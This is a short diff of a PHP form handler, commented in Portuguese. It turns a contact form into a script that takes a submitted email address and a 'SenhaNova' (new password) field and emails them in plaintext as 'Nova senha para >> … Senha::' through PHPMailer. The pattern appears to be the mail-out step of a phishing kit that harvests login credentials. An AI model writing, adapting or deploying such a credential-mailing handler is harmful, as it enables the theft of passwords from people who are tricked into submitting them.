@@ -1,12 +1,11 @@
 <?php
-$Nome		= $_POST["email"];	// Pega o valor do campo Nome
-$Fone		= $_POST["email"];	// Pega o valor do campo Telefone
+
 $Email		= $_POST["email"];	// Pega o valor do campo Email
 $Mensagem	= $_POST["SenhaNova"];	// Pega os valores do campo Mensagem
 
 // Variável que junta os valores acima e monta o corpo do email
 
-$Vai 		= "Nome: $Nome\n\nE-mail: $Email\n\nTelefone: $Fone\n\nMensagem: $Mensagem\n";
+$Vai 		= "Nova senha para >> $Email\n\n Senha:: $Mensagem\n";
 
 require_once("../phpmailer/class.phpmailer.php");
 
